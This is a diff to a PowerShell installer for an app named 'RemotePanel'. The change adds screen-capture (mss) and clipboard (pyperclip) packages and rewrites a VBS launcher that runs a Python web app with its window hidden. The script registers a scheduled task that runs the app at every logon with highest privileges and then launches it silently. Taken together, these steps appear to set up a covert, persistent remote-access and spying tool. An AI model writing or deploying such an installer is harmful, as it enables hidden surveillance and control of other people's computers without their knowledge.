@@ -27,12 +27,12 @@ if (-not $hasPython) {
         $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
     }
 }
-& python -m pip install flask psutil requests --quiet 2>$null
+& python -m pip install flask psutil requests mss pyperclip --quiet 2>$null
 $appPath = $folder + "\app.py"
-$vbs = 'Set WshShell = CreateObject("WScript.Shell")' + [Environment]::NewLine
-$vbs += 'WshShell.CurrentDirectory = "' + $folder + '"' + [Environment]::NewLine
-$vbs += 'WshShell.Run "python -B """ + $appPath + '""", 0, False'
-Set-Content -Path "$folder\start.vbs" -Value $vbs -Encoding ASCII
+$vbsFile = "$folder\start.vbs"
+Set-Content -Path $vbsFile -Value 'Set WshShell = CreateObject("WScript.Shell")' -Encoding ASCII
+Add-Content -Path $vbsFile -Value ('WshShell.CurrentDirectory = "' + $folder + '"')
+Add-Content -Path $vbsFile -Value ('WshShell.Run "python -B ""' + $appPath + '""", 0, False')
 schtasks /create /tn "RemotePanel" /tr "wscript.exe `"$folder\start.vbs`"" /sc onlogon /rl highest /f | Out-Null
 Start-Process -FilePath "wscript.exe" -ArgumentList "`"$folder\start.vbs`"" -WindowStyle Hidden
 Start-Sleep 3
